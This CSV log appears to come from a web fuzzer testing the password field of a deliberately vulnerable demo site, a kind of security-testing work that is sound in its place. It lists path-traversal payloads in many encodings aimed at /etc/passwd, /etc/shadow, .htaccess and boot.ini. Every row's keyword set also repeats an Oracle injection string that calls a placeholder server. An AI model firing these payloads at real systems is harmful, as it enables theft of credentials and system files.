id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword,TimeDelay,ContentLength
id_fuzz_1,174,uname=ciao§pass=../../../etc/passwd,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,175,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,176,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,177,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,178,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,179,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,180,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,181,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,182,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,183,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,184,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,185,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,186,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,187,uname=ciao§pass=../../../.htaccess,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,188,uname=ciao§pass=../../.htaccess,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,189,uname=ciao§pass=../.htaccess,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,190,uname=ciao§pass=.htaccess,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,191,uname=ciao§pass=././.htaccess,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,192,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,193,uname=ciao§pass=%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,194,uname=ciao§pass=%2e%2e%2f%2e%68%74%61%63%63%65%73%73,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,195,uname=ciao§pass=%2e%68%74%61%63%63%65%73%73,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,196,uname=ciao§pass=%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,197,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,198,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,199,uname=ciao§pass=%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,200,uname=ciao§pass=%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,201,uname=ciao§pass=%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,202,uname=ciao§pass=../../../../../../../../../../../../etc/hosts%00,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,203,uname=ciao§pass=../../../../../../../../../../../../etc/hosts,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,204,uname=ciao§pass=../../boot.ini,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,205,uname=ciao§pass=/../../../../../../../../%2A,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,206,uname=ciao§pass=../../../../../../../../../../../../etc/passwd%00,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,207,uname=ciao§pass=../../../../../../../../../../../../etc/passwd,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,208,uname=ciao§pass=../../../../../../../../../../../../etc/shadow%00,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,209,uname=ciao§pass=../../../../../../../../../../../../etc/shadow,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,210,uname=ciao§pass=/../../../../../../../../../../etc/passwd^^,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,211,uname=ciao§pass=/../../../../../../../../../../etc/shadow^^,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,212,uname=ciao§pass=/../../../../../../../../../../etc/passwd,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,213,uname=ciao§pass=/../../../../../../../../../../etc/shadow,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,214,uname=ciao§pass=/./././././././././././etc/passwd,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,215,uname=ciao§pass=/./././././././././././etc/shadow,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,216,uname=ciao§pass=\..\..\..\..\..\..\..\..\..\..\etc\passwd,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,217,uname=ciao§pass=\..\..\..\..\..\..\..\..\..\..\etc\shadow,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
